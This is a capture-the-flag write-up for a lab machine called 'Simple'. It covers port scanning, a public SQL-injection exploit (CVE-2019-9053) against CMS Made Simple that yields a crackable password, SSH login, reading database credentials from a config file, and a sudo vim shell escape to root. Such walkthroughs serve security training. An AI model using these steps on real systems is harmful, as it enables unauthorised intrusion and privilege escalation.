
---
# CTF Writeup: Simple

---
## Reconaissance

An initial scan revealed the following running services on the target server.

```
nmap -n -Pn -sS -p- 10.114.175.141                          
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-10 12:28 CDT
Nmap scan report for 10.114.175.141
Host is up (0.012s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 105.44 seconds
```

Another more detailled scan revealed further information about the running services.

```
nmap -n -Pn -sSCV -p 21,80,2222 10.114.175.141
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-10 12:30 CDT
Nmap scan report for 10.114.175.141
Host is up (0.017s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.227.246
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.51 seconds
```

Enumerated endpoints with "feroxbuster".

```
feroxbuster --url http://10.114.175.141
```

Found the following endpoints.

```
/simple
/simple/admin/login.php

```

Upon analyzing the webpage I found information about an user named "mitch" and Version Information about CMS Made Simple 2.2.8

Found the following exploit:

```
https://github.com/Dh4nuJ4/SimpleCTF-UpdatedExploit
```

Ran the exploit.

```
python3 cve-2019-9053.py -u http://10.114.175.141/simple -w /usr/share/wordlists/rockyou.txt -c -t 1
```

We retrieved the credentials for user "mitch".

```
[+] Sitepref_value found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

Logged in via SSH.

```
ssh mitch@10.114.175.141 -p 2222
The authenticity of host '[10.114.175.141]:2222 ([10.114.175.141]:2222)' can't be established.
ED25519 key fingerprint is: SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.114.175.141]:2222' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
mitch@10.114.175.141's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$
```

Retrieved user.txt in /home/mitch directory.

```
G00d j0b, keep up!
```

Found out that there is an MySQL Database running internally.

```
127.0.0.1:3306
```

Retrieved MySQL Credentials in /var/www/html/simple directory.

```
<?php
# CMS Made Simple Configuration File
# Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference
#
$config['dbms'] = 'mysqli';
$config['db_hostname'] = '127.0.0.1';
$config['db_username'] = 'bigtreeuser';
$config['db_password'] = 'password';
$config['db_name'] = 'bigtree';
$config['db_prefix'] = 'cms_';
$config['timezone'] = 'Europe/Bucharest';
```

Enumerated sudo permissions of user "mitch" and found out he is able to run the "vim" binary with root permissions and no authentication.

```
mitch@Machine:/$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

Executed vim with sudo permissions.

```
sudo vim
```

I escaped the vim session with :!bash and gained root shell.

Retrieved root.txt in /root directory.

```
W3ll d0n3. You made it!
```
